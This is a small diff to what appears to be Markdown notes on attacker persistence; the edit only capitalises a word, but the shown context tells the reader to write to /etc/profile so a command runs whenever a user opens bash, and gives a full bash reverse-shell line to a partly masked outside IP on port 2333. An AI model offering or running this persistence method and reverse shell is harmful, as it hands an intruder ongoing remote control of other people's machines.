@@ -18,7 +18,7 @@
   
   # minute hour day month week
   ```
-  - or write to _/etc/profile_, the bash will be executed when user open bash window:
+  - Or write to _/etc/profile_, the bash will be executed when user open bash window:
   ```
   /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
   ```
